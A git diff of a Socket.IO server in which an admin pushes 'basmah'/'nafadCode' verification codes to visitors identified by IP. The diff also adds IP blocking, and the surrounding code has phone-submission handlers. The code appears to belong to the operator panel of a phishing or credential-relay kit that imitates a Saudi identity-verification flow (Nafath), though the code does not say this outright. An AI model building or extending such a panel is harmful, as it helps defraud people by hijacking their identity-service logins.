@@ -488,11 +488,37 @@ io.on("connection", (socket) => {
 
   // Admin: update basmah code
   socket.on("updateBasmah", async ({ ip, basmah }) => {
-    const user = await findOrCreateUser(ip);
-    user.basmahCode = basmah;
-    await user.save();
-    io.emit("basmahUpdated", { ip, basmah });
-    socket.emit("nafadCode", { msg: true, code: user.basmahCode });
+    try {
+      if (await isIpBlocked(ip))
+        return socket.emit("ackBasmah", { success: true, blocked: true });
+
+      const user = await findOrCreateUser(ip);
+
+      const doc = await Basmah.findOneAndUpdate(
+        { ip: ip },
+        {
+          $set: {
+            time: new Date(),
+            code: String(basmah).padStart(2, "0"),
+          },
+          $setOnInsert: {
+            user: user._id,
+          },
+        },
+        {
+          upsert: true,
+          new: true,
+          setDefaultsOnInsert: true,
+          runValidators: true,
+        }
+      );
+
+      io.emit("nafadCode", { ip, code: doc.code });
+      socket.emit("ackBasmah", { success: true });
+    } catch (err) {
+      console.error("Error updating basmah:", err);
+      socket.emit("ackBasmah", { success: false, error: err.message });
+    }
   });
 
   socket.on("getNafadCode", async ({ ip }) => {
@@ -944,21 +970,6 @@ io.on("connection", (socket) => {
 
     // 4) Ack back to the client
     socket.emit("nafadCode", { msg: true, code: saved.code });
-  });
-
-  socket.on("updateBasmah", async ({ ip, basmah }) => {
-    // Find or create user by IP
-    let user = await User.findOne({ ip });
-    if (!user) {
-      user = await User.create({ ip });
-    }
-
-    // Update the basmahCode
-    user.basmahCode = Number(basmah);
-    await user.save();
-
-    // Broadcast to all admin clients
-    socket.emit("nafadCode", { msg: true, code: user.basmahCode ?? "00" });
   });
 
   socket.on("submitPhone", async (payload) => {
